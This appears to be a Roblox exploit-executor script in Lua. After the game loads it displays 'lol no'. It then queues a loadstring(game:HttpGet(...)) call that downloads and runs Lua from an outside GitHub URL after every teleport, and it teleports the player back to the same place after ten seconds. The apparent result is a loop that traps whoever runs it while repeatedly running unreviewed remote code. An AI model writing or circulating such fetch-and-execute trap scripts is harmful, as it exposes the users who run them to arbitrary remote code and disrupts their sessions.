repeat wait() until game:IsLoaded()
Instance.new("Message", workspace).Text = "lol no"
game.Players.LocalPlayer.OnTeleport:Connect(function(State)
    queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/denherst/shiny-train/main/w.lua"))()')
end)  

task.wait(10)

game:GetService("TeleportService"):Teleport(game.PlaceId)
